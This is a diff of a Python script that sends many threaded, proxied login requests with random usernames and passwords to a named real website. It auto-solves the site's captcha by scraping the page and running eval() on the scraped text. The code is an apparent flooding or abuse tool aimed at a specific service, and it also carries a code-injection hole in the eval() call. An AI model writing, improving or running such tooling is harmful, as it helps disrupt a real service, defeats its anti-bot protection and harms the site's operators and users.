@@ -7,6 +7,10 @@ import threading
 from proxies import proxy
 import os
 import asyncio
+import dotenv
+import details_generator as DG
+
+dotenv.load_dotenv()
 
 print(
     """
@@ -15,41 +19,28 @@ print(
 )
 
 
-class Console:
+ip = "104.26.5.11"
 
-    ip = "104.26.5.11"
 
-    def captcha_solve():
-        url = requests.get("https://entrar.in/login/login", proxies=proxy, timeout=5)
-        soup = BS(url.content, features="html.parser")
-        soup = soup.find("div", {"class": "col-lg-3 col-sm-3"})
-        captcha = soup.text.replace(" =", "")
-        captcha = eval(captcha)
-        return captcha
-
-    def rand_gen_user():
-        user = "".join(random.choice("123456789") for _ in range(8))
-        user = "B/" + user
-        return user
-
-    def rand_gen_pass():
-        password = "".join(random.choice("123456789abcdefghijklmnopqrstuvwxyz") for _ in range(8))
-        return password
+def captcha_solve():
+    url = requests.get("https://entrar.in/login/login", proxies=proxy, timeout=5)
+    soup = BS(url.content, features="html.parser")
+    soup = soup.find("div", {"class": "col-lg-3 col-sm-3"})
+    captcha = soup.text.replace(" =", "")
+    captcha = eval(captcha)
+    return captcha
 
 
 def send_req():
+    limit = random.randint(1, 8)
     r = requests.Session()
-    url1 = "https://entrar.in/login/login"
-    url2 = "https://entrar.in/login/auth"
-    user = Console.rand_gen_user()
-    password = Console.rand_gen_pass()
-    captcha = Console.captcha_solve()
+    url = "https://entrar.in/login/auth"
+    user = DG.rand_user(limit)
+    password = DG.rand_pass(limit)
+    captcha = captcha_solve()
     payload = {"username": user, "password": password, "captcha": str(captcha)}
-    param = {"headers": payload}
-    req1 = r.post(url1, params=param, proxies=proxy, timeout=5)
-    req2 = r.post(url2, params=param, proxies=proxy, timeout=5)
+    req1 = r.post(url, data=payload, proxies=proxy, timeout=5)
     print(Fore.LIGHTGREEN_EX, "Request Sent to ------->", req1.url, "-", req1.elapsed.total_seconds(), "ms")
-    print(Fore.LIGHTGREEN_EX, "Request Sent to ------->", req2.url, "-", req2.elapsed.total_seconds(), "ms")
 
 
 threads = []
